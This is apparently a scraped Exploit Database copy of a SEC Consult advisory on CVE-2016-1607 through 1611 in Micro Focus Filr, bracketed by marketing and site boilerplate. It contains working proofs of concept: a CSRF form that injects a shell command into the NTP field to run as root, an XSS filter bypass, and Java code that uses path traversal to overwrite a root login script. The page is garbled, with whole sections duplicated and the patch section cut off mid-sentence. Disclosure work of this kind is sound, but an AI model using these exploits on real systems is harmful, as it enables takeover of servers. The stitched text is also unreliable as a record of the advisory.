### Stay in control

Control who can share files, what files can be shared, and with whom, using encryption for secure data transfers and configuring user and group visibility.

> We have full control over data, and users gain instant file access, boosting responsiveness and productivity.

Vendor description:
-------------------
"Unlike other mobile file access and collaborative file sharing solutions, Micro
Focus Filr has been designed with the enterprise in mind, resulting in less
administration, better security and more productive users."

URL: <https://www.novell.com/products/filr/>

Business recommendation:
------------------------
During a very quick security check several vulnerabilities with high impact
have been discovered. SEC Consult recommends to immediately apply the patches
provided by Micro Focus to address these issues.

Please note that since SEC Consult did not conduct a thorough technical security
check SEC Consult cannot make a statement regarding the overall security of the
Micro Focus Filr appliance.

Vulnerability overview/description:
-----------------------------------
During a quick security check several vulnerabilities have been identified that
ultimately allow an attacker to completely compromise the appliance:

1) Cross Site Request Forgery (CSRF) - CVE-2016-1607
Several functions within the appliance's administative interface lack protection
against CSRF attacks. This allows an attacker who targets an authenticated
administrator to reconfigure the appliance.

2) OS Command Injection - CVE-2016-1608
The appliance administrative interface allows an authenticated attacker to
execute arbitrary operating system commands. Please note that an attacker can
combine this vulnerability with vulnerability #1. In this scenario, an attacker
does not need to be authenticated.

3) Insecure System Design
The appliance uses a Jetty application server to provide the appliance
administration interface. This application server is started as the superuser
"root". Please note that combined with vulnerability #1 and #2 an attacker can
run commands as the superuser "root" without the need for any authentication.
For vendor remark on #3 see solution section.

4) Persistent Cross-Site Scripting - CVE-2016-1609
The Filr web interface uses a blacklist filter to try to strip any JavaScript
code from user input. However, this filter can be bypassed to persistently
inject JavaScript code into the Filr web interface.

5) Missing Cookie Flags
The httpOnly cookie flag is not set for any session cookies set by both the
administrative appliance web interface and the Filr web interface. Please note
that combined with vulnerability #4 an attacker can steal session cookies of
both the appliance administration interface and the Filr web interface (since
cookies are shared across ports).
For vendor remark on #5 see solution section.

6) Authentication Bypass - CVE-2016-1610
An unauthenticated attacker is able to upload email templates.

7) Path Traversal - CVE-2016-1610
The functionality that allows an administrator to upload email templates fails
to restrict the directory the templates are uploaded to. Please note that
combined with vulnerability #6 an attacker is able to upload arbitray files with
the permissions of the system user "wwwrun".

8) Insecure File Permissions - CVE-2016-1611
A file that is run upon system user login is world-writeable. This allows a
local attacker with restricted privileges to inject commands that are being
executed as privileged users as soon as they log into the system. Please note
that combined with vulnerabilities #6 and #7 an unauthenticated attacker can
inject commands that are executed as privileged system users (e.g. root) using
the Filr web interface.

Proof of concept:
-----------------
1, 2, 3)
The following HTML fragment demonstrates that using a CSRF attack (#1) system
commands can be injected (#2) that are executed as the user root (#3):

----- snip -----
<html>
  <body>
    <form action="https://<host>:9443/vaconfig/time" method="POST">
      <input type="hidden" name="ntpServer" value="0.novell.pool.ntp.org
1.novell.pool.ntp.org';id>/tmp/test;'" />
      <input type="hidden" name="region" value="europe" />
      <input type="hidden" name="timeZone" value="Europe/Vienna" />
      <input type="hidden" name="utc" value="true" />
      <input type="hidden" name="_utc" value="on" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
----- snip -----

4)
The following string demonstrates how the XSS filter can be circumvented:
<img src='>' onerror='alert(1)'>

This string can e.g. be used by a restricted user in the "phone" field of the
user profile. The script is executed by anyone viewing the profile (e.g. admins).

5)
None of the session cookies are set with the httpOnly flag.

6, 7, 8)
The following Java fragment demonstrates how an unauthenticated attacker (#6)
can overwrite a file in the filesystem (#7 & #8) that is executed upon user
login of e.g. the root user:

----- snip -----
String sessionCookie = "sectest";
String host = "http://<host>/";

ProxySettings settings = new ProxySettings();
HttpCookie cookie = new HttpCookie("JSESSIONID", sessionCookie);

settings.setCookieManager(new CookieManager());
settings.getCookieManager().getCookieStore().add(new URI(host), cookie);

settings.setModuleBaseUrl(host + "ssf/gwt/");
settings.setRemoteServiceRelativePath("gwtTeaming.rpc");
settings.setPolicyName("338D4038939D10E7FC021BD64B318D99");
GwtRpcService svc = SyncProxy.createProxy(GwtRpcService.class, settings);

VibeXsrfToken token = new VibeXsrfToken(
                StringUtils.toHexString(Md5Utils.getMd5Digest(sessionCookie.getBytes())));
((HasRpcToken) svc).setRpcToken(token);

String fileName = "../../../../etc/profile.d/vainit.sh";
FileBlob fileBlob = new FileBlob(ReadType.TEXT, fileName, "", 1l, 4, 1l, false, 4l);
fileBlob.setBlobDataString("id > /tmp/profiledtest\n");
BinderInfo folderInfo = new BinderInfo();
folderInfo.setBinderId((long) 1);
folderInfo.setBinderType(BinderType.WORKSPACE);
folderInfo.setWorkspaceType(WorkspaceType.EMAIL_TEMPLATES);
VibeRpcCmd cmd = new UploadFileBlobCmd(folderInfo, fileBlob, true);
HttpRequestInfo ri = new HttpRequestInfo();
svc.executeCommand(ri, cmd);
----- snip -----

Vulnerable / tested versions:
-----------------------------
The version 2.0.0.421 of Micro Focus Filr was found to be vulnerable. This
version was the latest version at the time of the discovery.

According to the vendor, Filr 1.2 is also vulnerable.

be applied immediately:
<https://download.novell.com/Download?buildid=3V-3ArYN85I~>
Those patches fix vulnerabilities #1, #2, #4, #6, #7

"Filr 1.2 Security Update 3" can be found here:
<https://download.novell.com/Download?buildid=BOTiHcBFfv0~>

Knowledge base references at Micro Focus:
Issue #1: <https://www.novell.com/support/kb/doc.php?id=7017786>
Issue #2: <https://www.novell.com/support/kb/doc.php?id=7017789>
Issue #4: <https://www.novell.com/support/kb/doc.php?id=7017787>
Issue #6 & #7: <https://www.novell.com/support/kb/doc.php?id=7017788>

Local privilege escalation via insecure file permissions (#8) has
already been fixed in the Filr 2.0 security update 1 in June:
<https://www.novell.com/support/kb/doc.php?id=7017689>

Issue #3: According to Micro Focus, Jetty actually runs as user
"vabase-jetty" but will pass commands off to another service on
the box that runs as root to perform privileged actions.
They have fixed the command injection in this release and the
next release will include much more stringent parameter validation
for passing the commands.

Issue #5: According to Micro Focus, a component of Filr does not
function properly when the httpOnly flag is enabled. This will be
addressed in a future release.

Workaround:
-----------
None

Micro Focus Filr appliance.

Vulnerability overview/description:
-----------------------------------
During a quick security check several vulnerabilities have been identified that
ultimately allow an attacker to completely compromise the appliance:

1) Cross Site Request Forgery (CSRF) - CVE-2016-1607
Several functions within the appliance's administative interface lack protection
against CSRF attacks. This allows an attacker who targets an authenticated
administrator to reconfigure the appliance.

2) OS Command Injection - CVE-2016-1608
The appliance administrative interface allows an authenticated attacker to
execute arbitrary operating system commands. Please note that an attacker can
combine this vulnerability with vulnerability #1. In this scenario, an attacker
does not need to be authenticated.

3) Insecure System Design
The appliance uses a Jetty application server to provide the appliance
administration interface. This application server is started as the superuser
"root". Please note that combined with vulnerability #1 and #2 an attacker can
run commands as the superuser "root" without the need for any authentication.
For vendor remark on #3 see solution section.

4) Persistent Cross-Site Scripting - CVE-2016-1609
The Filr web interface uses a blacklist filter to try to strip any JavaScript
code from user input. However, this filter can be bypassed to persistently
inject JavaScript code into the Filr web interface.

5) Missing Cookie Flags
The httpOnly cookie flag is not set for any session cookies set by both the
administrative appliance web interface and the Filr web interface. Please note
that combined with vulnerability #4 an attacker can steal session cookies of
both the appliance administration interface and the Filr web interface (since
cookies are shared across ports).
For vendor remark on #5 see solution section.

6) Authentication Bypass - CVE-2016-1610
An unauthenticated attacker is able to upload email templates.

7) Path Traversal - CVE-2016-1610
The functionality that allows an administrator to upload email templates fails
to restrict the directory the templates are uploaded to. Please note that
combined with vulnerability #6 an attacker is able to upload arbitray files with
the permissions of the system user "wwwrun".

8) Insecure File Permissions - CVE-2016-1611
A file that is run upon system user login is world-writeable. This allows a local
attacker with restricted privileges to inject commands that are being executed
as privileged users as soon as they log into the system. Please note that
combined with vulnerabilities #6 and #7 an unauthenticated attacker can inject
commands that are executed as privileged system users (e.g. root) using the Filr
web interface.

Proof of concept:
-----------------
1, 2, 3)
The following HTML fragment demonstrates that using a CSRF attack (#1) system
commands can be injected (#2) that are executed as the user root (#3):

----- snip -----
<html>
  <body>
    <form action="https://<host>:9443/vaconfig/time" method="POST">
      <input type="hidden" name="ntpServer" value="0.novell.pool.ntp.org 1.novell.pool.ntp.org';id>/tmp/test;'" />
      <input type="hidden" name="region" value="europe" />
      <input type="hidden" name="timeZone" value="Europe/Vienna" />
      <input type="hidden" name="utc" value="true" />
      <input type="hidden" name="_utc" value="on" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
----- snip -----

4)
The following string demonstrates how the XSS filter can be circumvented:
<img src='>' onerror='alert(1)'>

This string can e.g. be used by a restricted user in the "phone" field of the
user profile. The script is executed by anyone viewing the profile (e.g. admins).

5)
None of the session cookies are set with the httpOnly flag.

6, 7, 8)
The following Java fragment demonstrates how an unauthenticated attacker (#6)
can overwrite a file in the filesystem (#7 & #8) that is executed upon user login
of e.g. the root user:

----- snip -----
String sessionCookie = "sectest";
String host = "http://<host>/";

ProxySettings settings = new ProxySettings();
HttpCookie cookie = new HttpCookie("JSESSIONID", sessionCookie);

settings.setCookieManager(new CookieManager());
settings.getCookieManager().getCookieStore().add(new URI(host), cookie);

settings.setModuleBaseUrl(host + "ssf/gwt/");
settings.setRemoteServiceRelativePath("gwtTeaming.rpc");
settings.setPolicyName("338D4038939D10E7FC021BD64B318D99");
GwtRpcService svc = SyncProxy.createProxy(GwtRpcService.class, settings);

VibeXsrfToken token = new VibeXsrfToken(
		StringUtils.toHexString(Md5Utils.getMd5Digest(sessionCookie.getBytes())));
((HasRpcToken) svc).setRpcToken(token);

String fileName = "../../../../etc/profile.d/vainit.sh";
FileBlob fileBlob = new FileBlob(ReadType.TEXT, fileName, "", 1l, 4, 1l, false, 4l);
fileBlob.setBlobDataString("id > /tmp/profiledtest\n");
BinderInfo folderInfo = new BinderInfo();
folderInfo.setBinderId((long) 1);
folderInfo.setBinderType(BinderType.WORKSPACE);
folderInfo.setWorkspaceType(WorkspaceType.EMAIL_TEMPLATES);
VibeRpcCmd cmd = new UploadFileBlobCmd(folderInfo, fileBlob, true);
HttpRequestInfo ri = new HttpRequestInfo();
svc.executeCommand(ri, cmd);
----- snip -----

Issue #2: https://www.novell.com/support/kb/doc.php?id=7017789
Issue #4: https://www.novell.com/support/kb/doc.php?id=7017787
Issue #6 & #7: https://www.novell.com/support/kb/doc.php?id=7017788

Local privilege escalation via insecure file permissions (#8) has
already been fixed in the Filr 2.0 security update 1 in June:
https://www.novell.com/support/kb/doc.php?id=7017689

Issue #3: According to Micro Focus, Jetty actually runs as user
"vabase-jetty" but will pass commands off to another service on
the box that runs as root to perform privileged actions.
They have fixed the command injection in this release and the
next release will include much more stringent parameter validation
for passing the commands.

Issue #5: According to Micro Focus, a component of Filr does not
function properly when the httpOnly flag is enabled. This will be
addressed in a future release.

Workaround:
-----------

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
